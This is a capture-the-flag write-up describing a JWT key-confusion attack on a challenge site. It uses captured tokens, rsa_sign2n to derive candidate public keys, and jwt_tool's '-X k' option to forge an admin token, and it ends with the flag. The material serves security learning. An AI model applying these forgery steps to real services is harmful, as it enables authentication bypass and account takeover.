Based on jsonwebtoken version 4.0.0 There is a vulnerabilities called `key confusion` In order to exploit this vuln we need a public key

Then i found this writeup on google https://ctftime.org/writeup/30541, this chall is from DownUnderCTF 2021

There's a tool called [rsa_sign2n](https://github.com/silentsignal/rsa_sign2n) that derives a publickey from two pair off signed key

So, i make a two token using same credentials by login on the site

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VyIjoiZGFmYSIsImlhdCI6MTcyMDI1NDA0OX0.JCOomEW0VvV4GBHL17g4IkFUTWGU7DOxoY2pqd1o8wUkHNBzj8LCOx2xLjhZElNNnRbEP8Rd9LxGykc8vvlo4h8Kyf_VoOk_TQNa-VQsV9Q9cNbwZEuiNNj6ep1gP0THeAhDnbadgGmU4Cf29ZPypsSe1nn2tzS4bhJ7oqnRz1jO7k4DvEN3x_BrAtzFHFgIahz9gNURhr4Cp9-pJKs4CCj3wu4y4bpNh3yFfNLIj4LPZlBGdaAAeRY9SH5P3DBzxWD-x3SjE6tS8i3C52ETfaBQicVi2u3SJR4kraohdiLPBjvv4Nn776yIHItX1bepzKMMqcrG-e5s_CTSCZ2bPw

eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VyIjoiZGFmYSIsImlhdCI6MTcyMDI1NDA4NX0.WXr8B9x7ydSBsS8upSk0w6SPucxXYvzJCl8mvRkP7wRp1hRQ_WPNe0hGb2r-jKK7-FBCVVkT_2NYxjnJmONlIOVAl_9JNBFkBVtgctkwgmkIhCR03OFWBK4jiQP3afKllG9EhRfrUc3BhUldp7h5lmSEXkt60sa6CJrYB_Ez2a_pzVpwhG81wIgaQl_Edx1pSGb6-BLroCB3yQvcVUZ4a1gDj1VB2jKZCV_Gbg8DaSuPyAXp3qbv_eREA6LoMigcS1xtc9IWHZEw7ZO_ui0RhEbPBJ2uBqEhW65lnzd8BpDoh70ORysC8NhRqAScAvX6DvxsXkL6vEv54GU8__AIvQ
```

Docker build on standalone folder from rsa_sig2n git

```bash
docker build -t rsa-sign2n .
docker run -it rsa-sign2n /bin/bash
```

Then pass the pair of the signed key
```bash
python3 jwt_forgery.py \
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VyIjoiZGFmYSIsImlhdCI6MTcyMDI1NDA0OX0.JCOomEW0VvV4GBHL17g4IkFUTWGU7DOxoY2pqd1o8wUkHNBzj8LCOx2xLjhZElNNnRbEP8Rd9LxGykc8vvlo4h8Kyf_VoOk_TQNa-VQsV9Q9cNbwZEuiNNj6ep1gP0THeAhDnbadgGmU4Cf29ZPypsSe1nn2tzS4bhJ7oqnRz1jO7k4DvEN3x_BrAtzFHFgIahz9gNURhr4Cp9-pJKs4CCj3wu4y4bpNh3yFfNLIj4LPZlBGdaAAeRY9SH5P3DBzxWD-x3SjE6tS8i3C52ETfaBQicVi2u3SJR4kraohdiLPBjvv4Nn776yIHItX1bepzKMMqcrG-e5s_CTSCZ2bPw \
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VyIjoiZGFmYSIsImlhdCI6MTcyMDI1NDA4NX0.WXr8B9x7ydSBsS8upSk0w6SPucxXYvzJCl8mvRkP7wRp1hRQ_WPNe0hGb2r-jKK7-FBCVVkT_2NYxjnJmONlIOVAl_9JNBFkBVtgctkwgmkIhCR03OFWBK4jiQP3afKllG9EhRfrUc3BhUldp7h5lmSEXkt60sa6CJrYB_Ez2a_pzVpwhG81wIgaQl_Edx1pSGb6-BLroCB3yQvcVUZ4a1gDj1VB2jKZCV_Gbg8DaSuPyAXp3qbv_eREA6LoMigcS1xtc9IWHZEw7ZO_ui0RhEbPBJ2uBqEhW65lnzd8BpDoh70ORysC8NhRqAScAvX6DvxsXkL6vEv54GU8__AIvQ
```

![alt text](image.png)
From the output, i get 4 files of public key, so i thought i need to try each of it

In jwt_tool we can run the `Key-Confusion` exploit using `-X k` flags. But first we need to tamper the `user` value to `admin` on the token.
![alt text](image-1.png)

And then run the `jwt_tool` with `-X k -pk publickey.pem` flags to the tampered token

Then we can replace the token with the generated token from `jwt_tool`

After that we can go to the admin page and get the flag

> DUCTF{c0nfus!ng_0nE_bUG_@t_a_tIme}
